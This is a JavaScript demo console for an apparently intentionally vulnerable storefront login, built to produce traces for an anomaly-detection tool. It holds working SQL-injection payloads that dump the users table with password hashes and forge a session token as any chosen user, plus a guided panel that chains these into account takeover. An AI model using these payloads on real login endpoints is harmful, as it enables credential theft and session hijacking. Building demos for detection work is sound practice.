/*
 * OdiGear — Red Team demo console
 * -------------------------------
 * Interactive companion to the auth-service SQL-injection demo. Everything here
 * drives the REAL (intentionally vulnerable) /api/auth/login endpoint, so every
 * click or console command produces a genuine trace for Odigos anomaly detection.
 *
 * Two front-ends to the same attack:
 *   1. A guided in-UI panel (open from the login screen, or #attack in the URL).
 *   2. window.odimall  — drive it from the browser DevTools / inspect tab.
 *
 * This is a demo artifact. The vulnerability it exploits is deliberate.
 */
(function () {
  'use strict';

  // Anomalous-origin markers. Browsers forbid setting User-Agent / X-Forwarded-For
  // from fetch(), but these custom headers are forwarded by the api-gateway and
  // read by auth-service as the "this login came from somewhere unusual" signal.
  const ANOMALY_HEADERS = {
    'X-OdiMall-Origin': 'anomalous',
    'X-OdiMall-Attack': 'redteam-console',
  };

  const DUMP_PAYLOAD = "' OR '1'='1";
  const effectiveSql = (username) =>
    `SELECT id, username, email, role, password_hash FROM users WHERE username = '${username}' LIMIT 100`;
  // Targeted bypass: tautology (returns all rows -> triggers the breach path) with
  // the chosen victim ordered into row 0, so auth-service issues a token as them.
  const bypassPayload = (victim) =>
    `' OR '1'='1' ORDER BY (username='${String(victim).replace(/'/g, "''")}') DESC -- `;

  let stolen = [];

  async function attackLogin(usernamePayload) {
    const res = await fetch('/api/auth/login', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', ...ANOMALY_HEADERS },
      body: JSON.stringify({ username: usernamePayload, password: 'x' }),
    });
    const data = await res.json().catch(() => ({}));
    return { status: res.status, data };
  }

  function decodeJwt(token) {
    try {
      const p = token.split('.')[1];
      return JSON.parse(atob(p.replace(/-/g, '+').replace(/_/g, '/')));
    } catch {
      return null;
    }
  }

  // ---- Attack primitives (shared by panel + console) ----

  async function dump() {
    const { status, data } = await attackLogin(DUMP_PAYLOAD);
    stolen = Array.isArray(data.exfiltrated) ? data.exfiltrated : [];
    return { status, rowsReturned: data.rowsReturned || stolen.length, accounts: stolen, sql: effectiveSql(DUMP_PAYLOAD), raw: data };
  }

  async function loginAs(victim) {
    const payload = bypassPayload(victim);
    const { status, data } = await attackLogin(payload);
    if (data && data.token) {
      try {
        localStorage.setItem('odigear_token', data.token);
        localStorage.setItem('odigear_user', JSON.stringify(data.user || null));
      } catch { /* storage unavailable */ }
    }
    return { status, token: data.token, user: data.user, claims: data.token ? decodeJwt(data.token) : null, sql: effectiveSql(payload), raw: data };
  }

  function enterStorefront() {
    // Reload so the app bootstraps with the hijacked session (init() -> /auth/me).
    window.location.hash = '';
    window.location.reload();
  }

  /* =========================================================================
   * 1) window.odimall — DevTools / inspect-tab API
   * ========================================================================= */
  const consoleApi = {
    help() {
      const style = 'color:#ff6b6b;font-weight:bold';
      console.log('%cOdiGear Red Team console', style);
      console.log('%c  odimall.dump()%c            — SQL-injection credential dump (steal every account)', 'color:#8b5cf6', '');
      console.log('%c  odimall.loginAs("alice")%c  — hijack a session as any stolen user (no password)', 'color:#8b5cf6', '');
      console.log('%c  odimall.enter("alice")%c    — hijack + walk into the storefront as that user', 'color:#8b5cf6', '');
      console.log('%c  odimall.whoami()%c          — show the current (possibly stolen) session', 'color:#8b5cf6', '');
      console.log('%c  odimall.panel()%c           — open the guided Red Team panel', 'color:#8b5cf6', '');
      console.log('%c  odimall.logout()%c          — drop the session', 'color:#8b5cf6', '');
      return '☠  every call hits the real vulnerable endpoint — watch the traces in Odigos';
    },
    async dump() {
      const r = await dump();
      console.log('%c[phase 1] SQL injection — credential dump', 'color:#ff6b6b;font-weight:bold');
      console.log('payload username:', JSON.stringify(DUMP_PAYLOAD));
      console.log('effective SQL  :', r.sql);
      console.log('rows returned  :', r.rowsReturned, '(a real login matches 0 or 1)');
      try { console.table(r.accounts); } catch { console.log(r.accounts); }
      return r.accounts;
    },
    async loginAs(username) {
      if (!username) return 'usage: odimall.loginAs("alice")';
      const r = await loginAs(username);
      if (!r.token) { console.warn('bypass failed (HTTP ' + r.status + ') — is AUTH_SECURE_QUERIES=true?'); return r.raw; }
      console.log('%c[phase 2] session hijacked as ' + (r.user && r.user.username), 'color:#ff6b6b;font-weight:bold');
      console.log('no password was used. effective SQL:', r.sql);
      console.log('token claims:', r.claims);
      console.log('→ call odimall.enter() or reload to walk into the storefront as this user');
      return r.user;
    },
    async enter(username) {
      if (username) { const r = await loginAs(username); if (!r.token) return 'bypass failed'; }
      enterStorefront();
    },
    whoami() {
      try {
        const u = JSON.parse(localStorage.getItem('odigear_user') || 'null');
        const t = localStorage.getItem('odigear_token');
        return { user: u, tokenClaims: t ? decodeJwt(t) : null };
      } catch { return null; }
    },
    logout() {
      try { localStorage.removeItem('odigear_token'); localStorage.removeItem('odigear_user'); } catch {}
      enterStorefront();
    },
    panel() { openPanel(); return 'opening Red Team panel…'; },
  };
  window.odimall = consoleApi;

  /* =========================================================================
   * 2) Guided in-UI Red Team panel
   * ========================================================================= */
  let panelEl = null;

  function esc(s) {
    return String(s == null ? '' : s).replace(/[&<>"]/g, (c) => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
  }

  function buildPanel() {
    const el = document.createElement('div');
    el.id = 'redTeamPanel';
    el.className = 'rt-panel';
    el.style.display = 'none';
    el.innerHTML = `
      <div class="rt-card">
        <div class="rt-head">
          <div class="rt-title">☠ Red Team Console <span class="rt-tag">live attack · real traces</span></div>
          <button class="rt-close" type="button" aria-label="Close">✕</button>
        </div>
        <p class="rt-intro">Every action below calls the real, intentionally vulnerable <code>/auth/login</code> endpoint. Watch the matching traces light up in Odigos.</p>

        <section class="rt-step" data-step="1">
          <h3><span class="rt-num">1</span> Breach the database — SQL injection</h3>
          <p>Send a tautology in the username so the login lookup dumps the entire <code>users</code> table instead of matching one account.</p>
          <div class="rt-code"><span class="rt-label">payload</span><code id="rtDumpPayload"></code></div>
          <div class="rt-code"><span class="rt-label">SQL run</span><code id="rtDumpSql"></code></div>
          <button class="rt-btn rt-danger" id="rtDumpBtn" type="button">Run SQL injection →</button>
          <div id="rtDumpResult" class="rt-result" style="display:none"></div>
        </section>

        <section class="rt-step rt-locked" data-step="2">
          <h3><span class="rt-num">2</span> Hijack a session — login with stolen access</h3>
          <p>Pick a stolen account. A targeted injection returns a valid session token for that user <strong>without their password</strong>, from an anomalous origin.</p>
          <div id="rtVictims" class="rt-victims"></div>
          <div id="rtHijackResult" class="rt-result" style="display:none"></div>
        </section>

        <section class="rt-step rt-locked" data-step="3">
          <h3><span class="rt-num">3</span> Walk in</h3>
          <p>Use the hijacked session to enter the storefront as the victim.</p>
          <button class="rt-btn rt-go" id="rtEnterBtn" type="button" disabled>Enter storefront as victim</button>
        </section>
      </div>`;
    document.body.appendChild(el);

    el.querySelector('.rt-close').addEventListener('click', closePanel);
    el.addEventListener('click', (e) => { if (e.target === el) closePanel(); });
    el.querySelector('#rtDumpPayload').textContent = DUMP_PAYLOAD;
    el.querySelector('#rtDumpSql').textContent = effectiveSql(DUMP_PAYLOAD);
    el.querySelector('#rtDumpBtn').addEventListener('click', onDump);
    el.querySelector('#rtEnterBtn').addEventListener('click', enterStorefront);
    return el;
  }

  function openPanel() {
    if (!panelEl) panelEl = buildPanel();
    panelEl.style.display = 'flex';
    document.body.classList.add('auth-locked');
  }
  function closePanel() {
    if (panelEl) panelEl.style.display = 'none';
    if (!document.getElementById('authGate') || document.getElementById('authGate').style.display === 'none') {
      document.body.classList.remove('auth-locked');
    }
  }

  async function onDump() {
    const btn = panelEl.querySelector('#rtDumpBtn');
    const out = panelEl.querySelector('#rtDumpResult');
    btn.disabled = true; btn.textContent = 'Injecting…';
    try {
      const r = await dump();
      if (!r.accounts.length) {
        out.innerHTML = `<div class="rt-fail">No rows leaked (HTTP ${r.status}). The remediated path (<code>AUTH_SECURE_QUERIES=true</code>) blocks this.</div>`;
        out.style.display = 'block';
        return;
      }
      const rows = r.accounts.map((a) => `
        <tr>
          <td>${esc(a.username)}</td>
          <td><span class="rt-role rt-role-${esc(a.role)}">${esc(a.role)}</span></td>
          <td class="rt-mono">${esc(a.email || '')}</td>
          <td class="rt-mono rt-hash" title="${esc(a.passwordHash || '')}">${esc((a.passwordHash || '').slice(0, 22))}…</td>
        </tr>`).join('');
      out.innerHTML = `
        <div class="rt-win">✓ Breach successful — ${r.rowsReturned} credential rows exfiltrated (a real login matches 0–1).</div>
        <table class="rt-table"><thead><tr><th>username</th><th>role</th><th>email</th><th>password hash</th></tr></thead><tbody>${rows}</tbody></table>`;
      out.style.display = 'block';
      renderVictims(r.accounts);
      unlockStep(2);
    } finally {
      btn.disabled = false; btn.textContent = 'Run SQL injection →';
    }
  }

  function renderVictims(accounts) {
    const wrap = panelEl.querySelector('#rtVictims');
    wrap.innerHTML = accounts.map((a) => `
      <button type="button" class="rt-victim" data-user="${esc(a.username)}">
        <span class="rt-victim-name">${esc(a.username)}</span>
        <span class="rt-role rt-role-${esc(a.role)}">${esc(a.role)}</span>
        <span class="rt-victim-go">hijack →</span>
      </button>`).join('');
    wrap.querySelectorAll('.rt-victim').forEach((b) =>
      b.addEventListener('click', () => onHijack(b.getAttribute('data-user'), b)));
  }

  async function onHijack(username, btnEl) {
    const out = panelEl.querySelector('#rtHijackResult');
    panelEl.querySelectorAll('.rt-victim').forEach((b) => b.classList.remove('rt-victim-active'));
    if (btnEl) btnEl.classList.add('rt-victim-active');
    out.style.display = 'block';
    out.innerHTML = `<div class="rt-pending">Hijacking ${esc(username)}…</div>`;
    const r = await loginAs(username);
    if (!r.token) {
      out.innerHTML = `<div class="rt-fail">Hijack failed (HTTP ${r.status}). Remediated path blocks the injection.</div>`;
      return;
    }
    out.innerHTML = `
      <div class="rt-win">✓ Session hijacked as <strong>${esc(r.user.username)}</strong> (${esc(r.user.role)}) — no password used.</div>
      <div class="rt-code"><span class="rt-label">SQL run</span><code>${esc(r.sql)}</code></div>
      <div class="rt-code"><span class="rt-label">token</span><code class="rt-hash">${esc((r.token || '').slice(0, 40))}…</code></div>
      <div class="rt-code"><span class="rt-label">claims</span><code>${esc(JSON.stringify(r.claims))}</code></div>
      <div class="rt-anom">origin flagged anomalous · X-OdiMall-Origin: anomalous</div>`;
    unlockStep(3);
    const enterBtn = panelEl.querySelector('#rtEnterBtn');
    enterBtn.disabled = false;
    enterBtn.textContent = `Enter storefront as ${r.user.username}`;
  }

  function unlockStep(n) {
    const s = panelEl.querySelector(`.rt-step[data-step="${n}"]`);
    if (s) s.classList.remove('rt-locked');
  }

  /* =========================================================================
   * Wiring: open-from-login link, URL hash, console banner
   * ========================================================================= */
  function wireOpeners() {
    const link = document.getElementById('openRedTeam');
    if (link) link.addEventListener('click', (e) => { e.preventDefault(); openPanel(); });
    if (/^#(attack|redteam)$/i.test(window.location.hash)) openPanel();
    window.addEventListener('hashchange', () => {
      if (/^#(attack|redteam)$/i.test(window.location.hash)) openPanel();
    });
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', wireOpeners);
  } else {
    wireOpeners();
  }

  // Console breadcrumb for the inspect-tab path.
  setTimeout(() => {
    console.log(
      '%c☠ OdiGear security demo%c  —  type %codimall.help()%c in this console to run the attack',
      'color:#ff6b6b;font-weight:bold', 'color:inherit', 'color:#8b5cf6;font-weight:bold', 'color:inherit'
    );
  }, 300);
})();
